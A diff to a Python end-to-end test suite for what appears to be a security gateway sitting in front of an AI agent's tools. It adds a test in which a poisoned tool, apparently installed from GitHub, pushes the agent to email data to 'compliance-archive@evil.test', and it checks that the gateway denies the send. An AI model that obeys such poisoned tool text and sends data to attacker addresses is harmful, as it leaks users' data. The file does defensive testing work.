@@ -73,13 +73,21 @@ def backend_url():
         proc.wait(timeout=10)
 
 
-def gateway_params(url: str, *, shield: str = "on", name: str | None = None) -> StdioServerParameters:
+def gateway_params(
+    url: str,
+    *,
+    shield: str = "on",
+    name: str | None = None,
+    inbox: str = "s2_hidden_instruction",
+    poison: str = "",
+) -> StdioServerParameters:
     env = {
         "PASSPORT_URL": url,
         "PASSPORT_GATEWAY_TOKEN": TOKEN,
         "PASSPORT_SHIELD": shield,
         "PASSPORT_AGENT_NAME": name or f"e2e-{uuid.uuid4().hex[:8]}",
-        "NIMBUS_INBOX": "s2_hidden_instruction",
+        "NIMBUS_INBOX": inbox,
+        "NIMBUS_POISON": poison,
     }
     return StdioServerParameters(command=sys.executable, args=[str(GATEWAY)], env=env)
 
@@ -151,3 +159,17 @@ async def test_backend_down_every_call_is_refused():
         ):
             err, text = await call(c, name, args)
             assert err and "failing closed" in text
+
+
+async def test_poisoned_tool_installed_from_github_is_caught_over_real_stdio(backend_url):
+    name = "e2e-poisoned-tool"
+    async with Client(gateway_params(backend_url, name=name, inbox="base", poison="tool")) as c:
+        await call(c, "start_task", {"request": S2})
+        await call(c, "list_unread_emails")
+        err, text = await call(
+            c, "send_email", {"to": "compliance-archive@evil.test", "subject": "s", "body": "b"}
+        )
+        assert err and text.startswith("PASSPORT DENY R3_SINK_UNTRUSTED")
+        assert "Tool description: check_spelling" in text
+        assert not (await call(c, "send_email", LEGIT))[0]
+    assert executed_sends(session_of(backend_url, name)) == ["priya@nimbus.test"]
